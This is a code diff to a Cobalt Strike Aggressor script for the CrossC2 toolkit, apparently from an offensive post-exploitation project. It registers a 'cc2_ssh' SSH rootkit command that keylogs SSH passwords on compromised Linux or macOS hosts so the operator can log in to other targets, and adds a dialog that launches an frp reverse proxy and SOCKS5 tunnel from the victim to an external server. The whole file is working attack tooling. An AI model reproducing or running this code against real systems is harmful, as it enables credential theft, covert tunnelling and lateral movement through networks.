@@ -5,7 +5,7 @@ sub printUsage_ssh {
     blog($1, "\nUsage: cc2_ssh <linux(32)/osx> <step> (lib_name)\n\troot permissions\nssh rootkit: Get the password of ssh to log in to other targets.\n\tstep: \t<install>, <copy>, <patch>, <run>, <uninstall> <clean>.\n\n\tstep 1. install: \tget a prepared dynamic library file `libxxx.0.0.1.so`.\n\tstep 2. patch: \tspecify the name of the dynamic library to patch.\n\tstep 3. run: \tstart running ssh rootkit.\n\tstep 4. uninstall: \tuninstall ssh rootkit.\n\tstep 5. clean: \tclean ssh rootkit.\nEx:\n\tcc2_ssh linux install\n\tcc2_ssh linux patch libxxx.0.0.1.so\n\tcc2_ssh linux run\n\tcc2_ssh linux uninstall libxxx.0.0.1.so\n\tcc2_ssh linux clean libxxx.0.0.1.so\n");
 }
 
-ssh_alias cc2_ssh {
+sub cc2_ssh {
     $taskName = "cc2_ssh"; # taskName
     $taskType = "so";  # $taskType -> ELF, MachO, so, dylib
     $taskResType = "keystrokes"; # keystrokes -> keylogger message
@@ -82,4 +82,74 @@ ssh_alias cc2_ssh {
     }
 }
 
+ssh_alias("cc2_ssh", &cc2_ssh);
+
 ssh_command_register("cc2_ssh", "CrossC2 SSH rootkit - Get the password of ssh to log in to other targets.", "\nUsage: cc2_ssh <linux(32)/osx> <step> (lib_name)\n\troot permissions\nssh rootkit: Get password for ssh login.\n\tstep: \t<install>, <copy>, <patch>, <run>, <uninstall> <clean>.\n\n\tstep 1. install: \tget a prepared dynamic library file `libxxx.0.0.1.so`.\n\tstep 2. patch: \tspecify the name of the dynamic library to patch.\n\tstep 3. run: \tstart running ssh rootkit.\n\tstep 4. uninstall: \tuninstall ssh rootkit.\n\tstep 5. clean: \tclean ssh rootkit.\nEx:\n\tcc2_ssh linux install\n\tcc2_ssh linux patch libxxx.0.0.1.so\n\tcc2_ssh linux run\n\tcc2_ssh linux uninstall libxxx.0.0.1.so\n\tcc2_ssh linux clean libxxx.0.0.1.so\n");
+
+
+
+
+sub openSSHKitDialogCallBack {
+    local('$bid $f_server_lh $f_server_lp $f_token $protocol $s5_username $s5_password $s5_port');
+    local('$os $arch $system');
+    $bid = $3['bid'];
+    $f_server_lh = $3['f_server_lh'];
+    $f_server_lp = $3['f_server_lp'];
+    $f_token = $3['f_token'];
+    $protocol = $3['protocol'];
+    $s5_username = $3['s5_username'];
+    $s5_password = $3['s5_password'];
+    $s5_port = $3['s5_port'];
+
+    $os = lc(beacon_info($bid, "os"));
+    $arch = beacon_info($bid, "arch");
+    $system = "";
+    if ('linux' isin $os) {
+        if ($arch eq 'x86') {
+            $system = "linux32";
+        } else if ($arch eq 'x64') {
+            $system = "linux";
+        }
+    } else if ('macos' isin $os) {
+        $system = "osx";
+    }
+    binput($bid, "cc2_frp $system $f_server_lh\:$f_server_lp $f_token $protocol $s5_username $s5_password\:$s5_port");
+    blog($bid, "s5(server\[$protocol\], client\[$system\]) \: $f_server_lh\:$s5_port $s5_username/$s5_password");
+    cc2_frp($bid, $system, $f_server_lh.':'.$f_server_lp, $f_token, $protocol, $s5_username.':'.$s5_password.':'.$s5_port);
+}
+
+sub openSSHKitDialog {
+    local('$bid $dialog');
+    $bid = $1;
+    $dialog = dialog("proxy s5", %(bid => $bid[0], f_server_lh => "x.x.x.x", f_server_lp => "4444", f_token => "frp-server-token", protocol => "tcp", s5_username => "admin", s5_password => "password", s5_port => "8080"), &openSSHKitDialogCallBack);
+    dialog_description($dialog, "setup frp proxy");
+
+    drow_text($dialog, "f_server_lh", "frp listening host: ", 20); 
+    drow_text($dialog, "f_server_lp", "frp listening port: ", 20);
+    drow_text($dialog, "f_token", "frp listening token: ", 20);
+    drow_combobox($dialog, "protocol", "Type: ", @("tcp", "udp"));
+    drow_text($dialog, "s5_username", "socks5 username: ");
+    drow_text($dialog, "s5_password", "socks5 password: ");
+    drow_text($dialog, "s5_port", "socks5 port: ");
+
+    dbutton_action($dialog, "run");
+    dialog_show($dialog);
+}
+
+
+sub cc2_ssh_status {
+    local('$bid $os $arch $system');
+    $bid = $1;
+    $os = lc(beacon_info($bid, "os"));
+    $arch = beacon_info($bid, "arch");
+    if ('linux' isin $os) {
+        if ($arch eq 'x64') {
+            return 'Linux64';
+        } else if ($arch eq 'x86') {
+            return 'Linux32';
+        }
+    } else if ('macos' isin $os) {
+        return 'MacOS(intel)';
+    }
+    return '';
+}
